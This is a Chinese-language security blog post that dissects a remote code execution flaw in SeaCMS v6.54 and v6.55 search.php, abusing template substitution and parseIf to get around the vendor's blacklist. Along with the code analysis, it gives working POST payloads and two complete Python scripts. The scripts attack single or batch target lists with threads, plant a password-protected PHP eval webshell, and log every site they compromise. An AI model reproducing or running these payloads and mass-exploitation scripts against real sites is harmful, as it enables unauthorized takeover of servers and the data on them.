<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-03-03 23:32</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/seacms/">#SeaCMS</a></span>
      <span><a href="https://getshe11.com/tags/getshell/">#getshell</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="前言">前言</h1>
<p>这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用<code>parseIf</code>函数的功能还可以继续利用。
因为上一篇也已经过了一遍<code>search.php</code>的执行过程，这篇就不再重复讲解了。
链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/</p>
<h1 id="环境">环境</h1>
<p><strong>Web：</strong> phpstudy
<strong>System：</strong> Windows 10 X64
<strong>Browser：</strong> Firefox Quantum
<strong>Python version ：</strong> 2.7</p>
<h1 id="v654漏洞详情">v6.54漏洞详情</h1>
<h2 id="漏洞代码执行">漏洞代码执行</h2>
<h3 id="payload">Payload</h3>
<p><strong>get:</strong><code>http://seacms.test/search.php</code>
<strong>POST:</strong> <code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></p>
<h3 id="执行结果">执行结果</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_1.png" alt=""></p>
<!-- raw HTML omitted -->
<h2 id="分析过程">分析过程</h2>
<ul>
<li>这个版本只是把<code>order</code>的变量做了限制，但是声明为global变量的不止<code>order</code>,为什么不用其他而用<code>order</code>，在上一篇已经讲过了。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$order <span style="color:#f92672">=</span> <span style="color:#a6e22e">RemoveXSS</span>(<span style="color:#a6e22e">stripslashes</span>($order));
$order <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>(<span style="color:#a6e22e">cn_substr</span>($order,<span style="color:#ae81ff">20</span>));
</code></pre></div><ul>
<li>我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过<code>echoSearchPage</code>函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用<code>highlight_string($content)</code>直接输出，不用右键查看源代码了。
大家可以先在<code>searchword</code>替换前输出<code>$content</code>，可以看到还没有开始替换。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_2.png" alt="">
那我们在替换后，输出<code>$content</code>，可以看到已经拼接成型了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_3.png" alt=""></li>
</ul>
<hr>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ae81ff">156</span><span style="color:#a6e22e">行</span> $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{seacms:searchword}&#34;</span>,$searchword,$content);
<span style="color:#a6e22e">。。。。。。。。。。</span>
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">intval</span>($searchtype)<span style="color:#f92672">==</span><span style="color:#ae81ff">5</span>)
{
    $tname <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($tid)<span style="color:#f92672">?</span><span style="color:#a6e22e">getTypeNameOnCache</span>($tid)<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $jq <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($jq)<span style="color:#f92672">?</span>$jq<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $area <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($area)<span style="color:#f92672">?</span>$area<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $year <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($year)<span style="color:#f92672">?</span>$year<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $yuyan <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($yuyan)<span style="color:#f92672">?</span>$yuyan<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $letter <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($letter)<span style="color:#f92672">?</span>$letter<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $state <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($state)<span style="color:#f92672">?</span>$state<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $ver <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($ver)<span style="color:#f92672">?</span>$ver<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
    $money <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($money)<span style="color:#f92672">?</span>$money<span style="color:#f92672">:</span><span style="color:#e6db74">&#39;全部&#39;</span>;
  $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:type}&#34;</span>,$tid,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:typename}&#34;</span>,$tname ,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:year}&#34;</span>,$year,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:area}&#34;</span>,$area,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:letter}&#34;</span>,$letter,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:lang}&#34;</span>,$yuyan,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:jq}&#34;</span>,$jq,$content);
    <span style="color:#66d9ef">if</span>($state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;w&#39;</span>){$state2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;完结&#34;</span>;}<span style="color:#66d9ef">elseif</span>($state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;l&#39;</span>){$state2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;连载中&#34;</span>;}<span style="color:#66d9ef">else</span>{$state2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;全部&#34;</span>;}
    <span style="color:#66d9ef">if</span>($money<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;m&#39;</span>){$money2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;免费&#34;</span>;}<span style="color:#66d9ef">elseif</span>($money<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;s&#39;</span>){$money2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;收费&#34;</span>;}<span style="color:#66d9ef">else</span>{$money2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;全部&#34;</span>;}
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:state}&#34;</span>,$state2,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:money}&#34;</span>,$money2,$content);
    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:ver}&#34;</span>,$ver,$content);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parsePageList</span>($content,<span style="color:#e6db74">&#34;&#34;</span>,$page,$pCount,$TotalResult,<span style="color:#e6db74">&#34;cascade&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;type&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;year&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;area&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;letter&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;lang&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;jq&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;state&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;ver&#34;</span>);
    $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSearchItemList</span>($content,<span style="color:#e6db74">&#34;money&#34;</span>);
}<span style="color:#f92672">.</span>
</code></pre></div><ul>
<li>又到<code>parseIf</code>处理这里了，我们都可以使用<code>highlight_string($content)</code>和<code>var_dump($iar[1])</code>来输出匹配前和匹配后的结果。
匹配前：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_4.png" alt="">
匹配后：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_5.png" alt="">
所以又执行了我们传参进去的代码。</li>
</ul>
<h3 id="构造poc">构造POC</h3>
<p>这个是大佬给出的POC：
<code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></p>
<p>其实很简单，每个参数做了限制，传入的字符串个数不能超过20个就行了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_6.png" alt="">
<code>9</code>就是$_POST[9]里面的值，可以任意修改只要不超过20个字符。</p>
<h2 id="用python编写批量getshell脚本">用Python编写批量Getshell脚本</h2>
<p>只是在上一个脚本做下修改就行了，同样支持单个和批量getshell。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_7.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">author:F0rmat
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> threading
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target):
    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
        target<span style="color:#f92672">=</span>target[<span style="color:#ae81ff">0</span>]
    url<span style="color:#f92672">=</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/search.php&#34;</span>
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;</span>
    data<span style="color:#f92672">=</span>{
        <span style="color:#e6db74">&#34;searchtype&#34;</span>:<span style="color:#e6db74">&#34;5&#34;</span>,
        <span style="color:#e6db74">&#34;searchword&#34;</span>:<span style="color:#e6db74">&#34;{if{searchpage:year}&#34;</span>,
        <span style="color:#e6db74">&#34;year&#34;</span>:<span style="color:#e6db74">&#34;:e{searchpage:area}}&#34;</span>,
        <span style="color:#e6db74">&#34;area&#34;</span>:<span style="color:#e6db74">&#34;v{searchpage:letter}&#34;</span>,
        <span style="color:#e6db74">&#34;letter&#34;</span>:<span style="color:#e6db74">&#34;al{searchpage:lang}&#34;</span>,
        <span style="color:#e6db74">&#34;yuyan&#34;</span>:<span style="color:#e6db74">&#34;(join{searchpage:jq}&#34;</span>,
        <span style="color:#e6db74">&#34;jq&#34;</span>:<span style="color:#e6db74">&#34;($_P{searchpage:ver}&#34;</span>,
        <span style="color:#e6db74">&#34;ver&#34;</span>:<span style="color:#e6db74">&#34;OST[9]))&#34;</span>,
        <span style="color:#e6db74">&#34;9[]&#34;</span>:payload,
    }

    shell <span style="color:#f92672">=</span> target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/shell.php&#39;</span>
    <span style="color:#66d9ef">try</span>:
        requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
        verify <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(shell, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;f0rmat&#34;</span> <span style="color:#f92672">in</span> verify<span style="color:#f92672">.</span>content:
            <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Write success,shell url:&#39;</span>,shell,<span style="color:#e6db74">&#39;pass:f0rmat&#39;</span>
            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;success.txt&#34;</span>,<span style="color:#e6db74">&#34;a+&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(shell<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;  pass:f0rmat&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">print</span> target,<span style="color:#e6db74">&#39;Write failure!&#39;</span>
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
        <span style="color:#66d9ef">print</span> e
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>:
        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;python check_order.py.py -h target/-f target-file&#39;</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-h&#34;</span>:
            exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
        <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
            <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                b <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(len(b)):
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> b[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>:
                        threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>exploit, args<span style="color:#f92672">=</span>(b[i]<span style="color:#f92672">.</span>split(),))<span style="color:#f92672">.</span>start()



<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    main()
</code></pre></div><h1 id="v655漏洞详情">v6.55漏洞详情</h1>
<h2 id="漏洞代码执行-1">漏洞代码执行</h2>
<h3 id="payload-1">Payload</h3>
<p><strong>GET:</strong><code>http://seacms.test/search.php</code>
<strong>POST:</strong> <code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*</code></p>
<h3 id="执行结果-1">执行结果</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_8.png" alt=""></p>
<h2 id="分析过程-1">分析过程</h2>
<ul>
<li>这次官方给出的修复是在<code>parseIf</code>函数里面加了黑名单。但是没有做SERVER变量的过滤，所以可以用SERVER变量的性质来达到写入命令。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parseIf</span>($content){
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($content,<span style="color:#e6db74">&#39;{if:&#39;</span>)<span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>){
            <span style="color:#66d9ef">return</span> $content;
            }<span style="color:#66d9ef">else</span>{
            $labelRule <span style="color:#f92672">=</span> <span style="color:#a6e22e">buildregx</span>(<span style="color:#e6db74">&#34;{if:(.*?)}(.*?){end if}&#34;</span>,<span style="color:#e6db74">&#34;is&#34;</span>);
            $labelRule2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{elseif&#34;</span>;
            $labelRule3<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{else}&#34;</span>;
            <span style="color:#a6e22e">preg_match_all</span>($labelRule,$content,$iar);
 <span style="color:#66d9ef">foreach</span>($iar <span style="color:#66d9ef">as</span> $v){
        $iarok[] <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;unlink&#39;</span>,<span style="color:#e6db74">&#39;opendir&#39;</span>,<span style="color:#e6db74">&#39;mysqli_&#39;</span>,<span style="color:#e6db74">&#39;mysql_&#39;</span>,<span style="color:#e6db74">&#39;socket_&#39;</span>,<span style="color:#e6db74">&#39;curl_&#39;</span>,<span style="color:#e6db74">&#39;base64_&#39;</span>,<span style="color:#e6db74">&#39;putenv&#39;</span>,<span style="color:#e6db74">&#39;popen(&#39;</span>,<span style="color:#e6db74">&#39;phpinfo&#39;</span>,<span style="color:#e6db74">&#39;pfsockopen&#39;</span>,<span style="color:#e6db74">&#39;proc_&#39;</span>,<span style="color:#e6db74">&#39;preg_&#39;</span>,<span style="color:#e6db74">&#39;_GET&#39;</span>,<span style="color:#e6db74">&#39;_POST&#39;</span>,<span style="color:#e6db74">&#39;_COOKIE&#39;</span>,<span style="color:#e6db74">&#39;_REQUEST&#39;</span>,<span style="color:#e6db74">&#39;_SESSION&#39;</span>,<span style="color:#e6db74">&#39;eval(&#39;</span>,<span style="color:#e6db74">&#39;file_&#39;</span>,<span style="color:#e6db74">&#39;passthru(&#39;</span>,<span style="color:#e6db74">&#39;exec(&#39;</span>,<span style="color:#e6db74">&#39;system(&#39;</span>,<span style="color:#e6db74">&#39;shell_&#39;</span>), <span style="color:#e6db74">&#39;@.@&#39;</span>, $v);
</code></pre></div><h3 id="构造poc-1">构造POC</h3>
<blockquote>
<p>还是利用目标的多重替换，详细步骤见SeaCMS6.54。导致最后写入assert($_SERVER[QUERY_STRING])，因为$SERVER变量默认是不检查数据的安全性的，因而当我们把命令加在url后，$_SERVER[QUERY_STRING]便可以获得我们发送的请求也就是这里传递的要执行的命令。(search.php?whami)这样就执行了assert(whoami)</p>
</blockquote>
<ul>
<li>关于$_SERVER可以看官方文档：http://php.net/manual/zh/reserved.variables.server.php</li>
</ul>
<p><strong>POC：</strong><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;ver=[QUERY_STRING]));/*</code></p>
<h2 id="用python编写批量getshell脚本-1">用Python编写批量Getshell脚本</h2>
<p>和上面差不多：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_9.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">author:F0rmat
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> threading
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target):
    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
        target<span style="color:#f92672">=</span>target[<span style="color:#ae81ff">0</span>]
    url<span style="color:#f92672">=</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/search.php?eval(join($_POST[9]))&#34;</span>
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;</span>
    data<span style="color:#f92672">=</span>{
        <span style="color:#e6db74">&#34;searchtype&#34;</span>: <span style="color:#e6db74">&#34;5&#34;</span>,
        <span style="color:#e6db74">&#34;9[]&#34;</span>: payload,
        <span style="color:#e6db74">&#34;searchword&#34;</span>: <span style="color:#e6db74">&#34;{if{searchpage:year}&#34;</span>,
        <span style="color:#e6db74">&#34;year&#34;</span>: <span style="color:#e6db74">&#34;:as{searchpage:area}}&#34;</span>,
        <span style="color:#e6db74">&#34;area&#34;</span>: <span style="color:#e6db74">&#34;s{searchpage:letter}&#34;</span>,
        <span style="color:#e6db74">&#34;letter&#34;</span>: <span style="color:#e6db74">&#34;ert{searchpage:lang}&#34;</span>,
        <span style="color:#e6db74">&#34;yuyan&#34;</span>: <span style="color:#e6db74">&#34;($_SE{searchpage:jq}&#34;</span>,
        <span style="color:#e6db74">&#34;jq&#34;</span>: <span style="color:#e6db74">&#34;RVER{searchpage:ver}&#34;</span>,
        <span style="color:#e6db74">&#34;ver&#34;</span>: <span style="color:#e6db74">&#34;[QUERY_STRING]));/*&#34;</span>,

    }

    shell <span style="color:#f92672">=</span> target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/shell.php&#39;</span>
    <span style="color:#66d9ef">try</span>:
        requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
        verify <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(shell, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;f0rmat&#34;</span> <span style="color:#f92672">in</span> verify<span style="color:#f92672">.</span>content:
            <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Write success,shell url:&#39;</span>,shell,<span style="color:#e6db74">&#39;pass:f0rmat&#39;</span>
            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;success.txt&#34;</span>,<span style="color:#e6db74">&#34;a+&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(shell<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;  pass:f0rmat&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">print</span> target,<span style="color:#e6db74">&#39;Write failure!&#39;</span>
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
        <span style="color:#66d9ef">print</span> e
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>:
        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;python check_order.py.py -h target/-f target-file&#39;</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-h&#34;</span>:
            exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
        <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
            <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                b <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(len(b)):
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> b[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>:
                        threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>exploit, args<span style="color:#f92672">=</span>(b[i]<span style="color:#f92672">.</span>split(),))<span style="color:#f92672">.</span>start()



<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    main()
</code></pre></div><h1 id="结束">结束</h1>
<p>昨天这个漏洞审计完没有写文章，因为感冒了，所以就早早睡觉了，在这变化多端的天气，表哥们也要注意身体哦。</p>
<h1 id="参考">参考</h1>
<p>源码我找不到6.54和55的了，不过这些方法在低版本的程序里面也能执行成功的。
所以这里找了一份6.53的：https://pan.lanzou.com/i0l9dsb</p>
<p>python脚本：https://github.com/F0r3at/Python-Tools/tree/master/seacms</p>
<p>漏洞参考文章：https://cloud.tencent.com/developer/article/1038216</p>
<p>PHP官方文档：http://php.net/docs.php</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%89%8d%e8%a8%80">
                            前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%8e%af%e5%a2%83">
                            环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#v654%e6%bc%8f%e6%b4%9e%e8%af%a6%e6%83%85">
                            v6.54漏洞详情
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c">
                            漏洞代码执行
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#payload">
                            Payload
                            </a>
